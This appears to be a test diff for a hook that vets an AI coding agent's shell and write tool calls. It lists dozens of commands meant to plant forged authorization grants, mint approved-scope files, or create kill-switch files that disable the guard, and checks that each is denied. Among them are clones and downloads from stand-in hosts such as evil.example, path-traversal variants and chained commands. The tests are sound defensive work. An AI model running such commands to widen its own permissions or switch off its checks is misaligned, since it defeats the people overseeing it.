@@ -1060,3 +1060,199 @@ describe("UAT residual dest-form writers fail-closed (#3382)", () => {
     }
   });
 });
+
+describe("UAT residual dest-form writers fail-closed (#3421)", () => {
+  function uatSeams() {
+    const state = activeUatState();
+    return readySeams({
+      loadAuthzState: () => state,
+      loadAuthzGrants: () => [],
+      loadRuntimeAuthority: () => ({
+        enabled: false,
+        allowPaths: [],
+        denyPaths: [],
+        scopes: { edits: true, push: true, merge: true },
+      }),
+    });
+  }
+
+  it("denies residual dest-form authz plant under UAT (not unclassifiable allow) (#3421)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "git clone https://evil.example/repo .deft/authz/grants/evil",
+      "git worktree add .deft/authz/grants/evil HEAD",
+      "git --attr-source HEAD clone https://example .deft/authz/grants/evil",
+      "git --attr-source log clone https://example .deft/authz/grants/evil",
+      "git --unlisted-global log clone https://example .deft/authz/grants/evil",
+      "git --shallow-file x clone https://example .deft/authz/grants/evil",
+      "git --attr-source HEAD worktree add .deft/authz/grants/evil HEAD",
+      "git --shallow-file x submodule add https://example .deft/authz/grants/evil",
+      "git submodule add https://evil.example/repo .deft/authz/grants/evil",
+      "ex .deft/authz/grants/evil.json",
+      "dos2unix -n src.json .deft/authz/grants/evil.json",
+      "aws s3 sync s3://evil .deft/authz/grants",
+      "aws s3api get-object --bucket b --key k --outfile .deft/authz/grants/evil.json",
+      "pijul clone https://evil.example/repo .deft/authz/grants/evil",
+      "pg_dump -f .deft/authz/grants/evil.sql db",
+      "convert src.json .deft/authz/grants/evil.json",
+      "magick src.json .deft/authz/grants/evil.json",
+      "mogrify .deft/authz/grants/evil.json",
+      "mogrify .deft/authz/x extra.png",
+      "fossil --workdir=.deft/authz/grants open repo.fossil",
+      "New-Item -Path .deft/authz/grants/evil.json -ItemType File",
+      "fallocate -l 1k .deft/authz/grants/evil.json",
+      "unknownwriter --workdir=.deft/authz/grants",
+      "cmake -E copy src.json .deft/authz/grants/evil.json",
+      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "ed .deft/authz/grants/evil.json",
+      "nvim .deft/authz/grants/evil.json",
+      "fossil --workdir .deft/authz/grants open repo.fossil",
+      "aws s3 cp s3://evil/x .deft/authz/grants/evil.json",
+      "aws s3 cp src .deft/authz/grants/evil.json",
+      "sudo aws s3 cp src .deft/authz/grants/evil.json",
+      "env aws s3 cp src .deft-directive-disable",
+      "env -C /tmp aws s3 cp src .deft/authz/grants/evil.json",
+      "git --list-objects-filter tree:0 clone https://example .deft/authz/grants/evil",
+      "convert src .deft/approved-scope/story.json",
+      "magick src .no-deft-directive",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies residual dest-form kill-switch plant under UAT (#3421)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "git clone https://evil.example/repo .deft-directive-disable",
+      "ex .no-deft-directive",
+      "dos2unix -n src .deft-directive-disable",
+      "aws s3 sync s3://evil .no-deft-directive",
+      "aws s3 cp src /tmp/out; touch .deft-directive-disable",
+      "pg_dump --file=.deft-directive-disable db",
+      "convert src .deft-directive-disable",
+      "fossil --workdir=.no-deft-directive open repo.fossil",
+      "New-Item -Path .deft-directive-disable -ItemType File",
+      "fallocate -l 1k .deft-directive-disable",
+      "unknownwriter --file .no-deft-directive",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Shell", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies Shell approved-scope mint under UAT matching Write (#3421)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "cp forged.json .deft/approved-scope/story.json",
+      "echo x > .deft/approved-scope/story.json",
+      "git clone https://evil.example/r .deft/approved-scope/evil",
+      "echo x > .deft//approved-scope/story.json",
+      "echo x > .deft/./approved-scope/story.json",
+      "cp forged.json .deft//approved-scope/story.json",
+      "echo x > .deft/foo/../approved-scope/story.json",
+      "cp forged.json .deft/foo/../approved-scope/story.json",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+    const writeDecision = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Write",
+          tool_input: { file_path: "/project/.deft/approved-scope/story.json" },
+        },
+      },
+      seams,
+    );
+    expect(writeDecision.verdict).toBe("deny");
+    expect(writeDecision.code).toMatch(/^authz-/);
+  });
+
+  it("still allows ordinary residual dest-form dest under UAT (non-authz) (#3421)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "git clone https://example.com/repo /tmp/out",
+      "git worktree add /tmp/out HEAD",
+      "ex /tmp/out",
+      "dos2unix -n src /tmp/out",
+      "aws s3 sync s3://example /tmp/out",
+      "pijul clone https://example.com/repo /tmp/out",
+      "pg_dump -f /tmp/out db",
+      "convert src /tmp/out",
+      "fossil --workdir=/tmp/out open repo.fossil",
+      "New-Item -Path /tmp/out -ItemType File",
+      "fallocate -l 1k /tmp/out",
+      "unknownwriter --workdir=/tmp/out",
+      "grep -f .deft/authz/patterns.txt src.txt",
+      "grep --file .deft/authz/patterns.txt src.txt",
+      "Get-Content -Path .deft/authz/state.json",
+      "git log -- .deft/authz/state.json",
+      "git log worktree -- .deft/authz/state.json",
+      "git --no-pager log worktree -- .deft/authz/state.json",
+      "git --attr-source HEAD log -- .deft/authz/state.json",
+      "echo x > .deft/authz-backup/story.json",
+      "echo x > .deft/foo/../authz-backup/story.json",
+      "aws s3 cp .deft/authz/x /tmp/out",
+      "env aws s3 cp .deft-directive-disable /tmp/out",
+      "env aws s3 cp .deft/authz/x /tmp/out",
+      "FOO=1 aws s3 cp .deft/authz/x /tmp/out",
+      "env -C /tmp aws s3 cp .deft/authz/x /tmp/out",
+      "timeout 5 aws s3 cp .deft/authz/x /tmp/out",
+      "echo x > foo.deft/authz/story.json",
+      "echo x > x.deft/approved-scope/story.json",
+      "convert .deft/authz/x /tmp/out",
+      "magick .deft/authz/x /tmp/out",
+      "aws s3 cp .deft/approved-scope/x /tmp/out",
+      "convert .deft-directive-disable /tmp/out",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: {
+            tool_name: "Bash",
+            tool_input: { command },
+          },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("allow");
+      expect(decision.code, command).toBe("shell-op-unclassifiable");
+    }
+  });
+});
